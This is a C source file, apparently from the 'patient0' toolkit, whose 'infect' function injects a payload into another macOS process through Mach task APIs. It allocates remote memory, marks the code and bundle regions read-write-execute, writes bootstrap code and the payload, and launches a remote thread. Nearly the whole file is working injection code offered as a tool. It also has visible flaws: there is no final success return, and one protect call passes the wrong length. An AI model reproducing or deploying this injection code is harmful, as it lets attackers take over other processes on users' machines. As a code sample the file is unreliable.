/*
 * vim:tw=80:ts=2:et:sw=2
 * Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file or at http://github.org/redpig/patient0.
 */
#include <mach/mach.h>
#include <mach/mach_types.h>
#include <mach/i386/thread_status.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/signal.h>
#include <sys/socket.h>

#include <patient0/log.h>
/* inject_bundle.h should be generated at make time */
#include "inject_bundle.h"

/* Creates a running thread in the target task and executes the given
 * bundle by calling:
 *   void run(void *bundle, size_t size)
 * after injection. This allos bundles to nest any data they need at the
 * end of their payload.
 */
#define DEFAULT_STACK_SIZE 64 * 1024
static const char stack[DEFAULT_STACK_SIZE] = { 0 };

bool infect(mach_port_t task,
            const unsigned char *bundle,
            size_t size,
            thread_act_t *thread) {
  i386_thread_state_t i386_state = { 0 };
  vm_address_t stack_seg, code_seg, bundle_seg;

  if (!bundle || !size) {
    p0_logf(P0_ERR, "no bundle supplied");
    return false;
  }

  /* Allocate the basics for the new thread:
   * - space for a stack
   * - space for the bootstrap code
   * - space for the injected bundle
   */
  if (vm_allocate(task, &stack_seg, sizeof(stack), 1) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to allocate a remote stack");
    return false;
  }
  /* At present, these regions seem to default to RWX. Bonus! */
  if (vm_allocate(task, &code_seg, inject_bundle_len, 1) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to allocate remote code segment");
    /* TODO: clean up the stack segment, maybe */
    return false;
  }
  if (vm_allocate(task, &bundle_seg, size, 1) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to allocate remote bundle segment");
    /* TODO: clean up the stack segment, maybe */
    return false;
  }
  /* Make sure bundle_seg and code_seg are executable */
  if (vm_protect(task, bundle_seg, size, false, VM_PROT_ALL) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to make bundle segment +RWX");
    /* we will keep on truckin' though. just in case! */
  }
  if (vm_protect(task, code_seg, size, false, VM_PROT_ALL) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to make code segment +RWX");
    /* we will keep on truckin' though. just in case! */
  }

  /* Now we should populate the given segments.
   * The stack must be filled with 0s so that we can
   * use it as a placeholder for the pthread_set_self call
   * in the inject_bundle code.
   */
  if (vm_write(task,
               code_seg,
               (vm_offset_t) inject_bundle,
               inject_bundle_len) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to write the bootstrap code");
    return false;
  }
  if (vm_write(task,
               stack_seg,
               (vm_offset_t) stack,
               sizeof(stack)) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to write the stack contents");
    return false;
  }
  if (vm_write(task,
               bundle_seg,
               (vm_offset_t) bundle,
               size) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to write the bundle");
    return false;
  }
  /* Setup the processor to execute our code */
  i386_state.__eip = code_seg;
  i386_state.__esp = stack_seg + (sizeof(stack) / 2);
  i386_state.__ebp = i386_state.__esp - 12;
  i386_state.__edi = bundle_seg;
  i386_state.__esi = size;
  if (thread_create_running(task,
                            i386_THREAD_STATE,
                            (thread_state_t) &i386_state,
                            i386_THREAD_STATE_COUNT,
                            thread) != KERN_SUCCESS) {
    p0_logf(P0_ERR, "failed to start thread");
    return false;
  }
}
